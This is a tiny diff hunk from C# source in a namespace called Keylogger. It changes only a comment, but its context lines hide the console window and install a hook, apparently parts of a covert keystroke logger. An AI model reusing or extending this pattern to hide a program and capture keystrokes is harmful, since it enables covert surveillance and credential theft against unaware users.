@@ -17,7 +17,7 @@ namespace Keylogger
         {
             var handle = GetConsoleWindow();
 
-            // Hide
+            // Hide Window
             ShowWindow(handle, SW_HIDE);
 
             _hookID = SetHook(_proc);
